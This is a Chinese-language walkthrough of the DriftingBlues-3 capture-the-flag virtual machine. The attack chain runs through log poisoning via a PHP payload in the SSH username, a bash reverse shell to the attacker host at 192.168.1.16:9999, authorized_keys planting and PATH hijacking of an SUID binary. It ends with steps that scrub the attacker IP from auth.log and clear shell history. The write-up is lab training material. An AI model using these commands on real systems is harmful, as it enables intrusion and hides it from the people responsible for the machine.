# 前言

靶机：`DriftingBlues-3`，IP地址`192.168.1.60`

攻击：`kali`，IP地址`192.168.1.16`

都采用虚拟机，网卡为桥接模式

# 主机发现

使用`arp-scan -l`或`netdiscover -r 192.168.1.1/24`

![](./pic-3/1.jpg)

# 信息收集

## 使用nmap扫描端口

![](./pic-3/2.jpg)

## 网站探测

访问80端口，并查看页面源码，发现有图片等信息，可能是网站型目录

![](./pic-3/3.jpg)

使用`gobuster、dirsearch、ffuf、dirb、dirbuster`等工具扫描目录

```shell
gobuster dir -u http://192.168.1.60 -w /usr/share/wordlists/dirb/big.txt -x php,zip,md,txt,html,jpg -b 404 -d
```

![](./pic-3/4.jpg)

![](./pic-3/5.jpg)

访问`robots.txt`，发现`eventadmins/`目录

![](./pic-3/6.jpg)

访问`drual、phpmyadmin、privacy`，发现都是信息`ABC`和`ABCD`

![](./pic-3/7.jpg)

访问`secret`

![](./pic-3/8.jpg)

访问`wp-admin`

![](./pic-3/9.jpg)

访问`eventadmins/`目录

![](./pic-3/10.jpg)

翻译一下，发现`/littlequeenofspades.html`页面

![](./pic-3/11.jpg)

访问`/eventadmins`

![](./pic-3/12.jpg)

# 漏洞寻找

查看页面源代码，发现编码`aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==`

![](./pic-3/13.jpg)

解码这个

![](./pic-3/14.jpg)

访问`/adminsfixit.php`，发现是`ssh`连接的认证日志，通过测试发现确实会记录`ssh`登录时的用户名、地址和端口

```shell
ssh test@192.168.1.60
```

![](./pic-3/15.jpg)

尝试连接，修改`ssh`连接时的用户为`php`脚本，测试是否可以

![](./pic-3/16.jpg)

访问页面

![](./pic-3/17.jpg)

测试是否可行

![](./pic-3/18.jpg)

# 漏洞利用

尝试使用`bash`命令反弹

```shell
bash -c 'bash -i >& /dev/tcp/192.168.1.16/9999 0>&1'
进行URL编码
bash+-i+>%26+%2fdev%2ftcp%2f192.168.1.16%2f9999+0>%261%0a
```

在`kali`中开启监听，然后使用浏览器执行上面的反弹命令

![](./pic-3/19.jpg)

# 靶机内信息收集

使用`find`寻找具有SUID权限和`capabilites`

```shell
find / -perm -4000 -print 2>/dev/null
find / -type f -executable 2>/dev/null | xagrs getcap -r 2>/dev/null
```

![](./pic-3/20.jpg)

查看定时任务

```shell
cat /etc/crontab
```

![](./pic-3/21.jpg)

查看网络状态信息

![](./pic-3/22.jpg)

查看备份文件夹，看有无信息

![](./pic-3/23.jpg)

使用`find`寻找其他用户具有可写权限

```shell
find /home -perm /2 2>/dev/null
-perm /2   是指其他用户具有可写权限，/2是指写权限
```

![](./pic-3/24.jpg)

查看这个目录，发现具有写权限

![](./pic-3/25.jpg)



# 提权

## 提权至robertj

在`kali`生成`ssh`的公私钥

![](./pic-3/26.jpg)

然后把公钥`id_rsa.pub`上传到这个目录下，改名为`authorized_keys`

![](./pic-3/27.jpg)

然后使用`ssh`私钥连接

![](./pic-3/28.jpg)

之前使用`find`寻找具有SUID权限文件，发现`getinfo`，在`linux`中并无该命令，测试该命令

![](./pic-3/29.jpg)

把这个文件下载到`kali`

```shell
scp robertj@192.168.1.60:/usr/bin/getinfo ./
```

![](./pic-3/30.jpg)

使用`strings`命令查看

![](./pic-3/31.jpg)

## 提权至root

那么可以使用`export`设置临时变量的优先目录，最好在`/tmp`目录

![](./pic-3/32.jpg)

编写脚本提权

```shell
echo "/bin/bash" > ip
```

![](./pic-3/33.jpg)

查看`flag`

![](./pic-3/34.jpg)

# 清除痕迹

清理日志

```shell
sed -i "/192.168.1.16/d" auth.log
```

![](./pic-3/35.jpg)

删除之前生成的公钥

![](./pic-3/36.jpg)

清除命令历史记录

![](./pic-3/37.jpg)

# 总结

1. 主要考证日志文件的利用，这里就是利用验证登录日志`auth.log`通过`adminsfixit.php`文件展露
2. 然后就是考察`ssh`公私钥的使用
3. 考察临时环境变量的优先级目录



















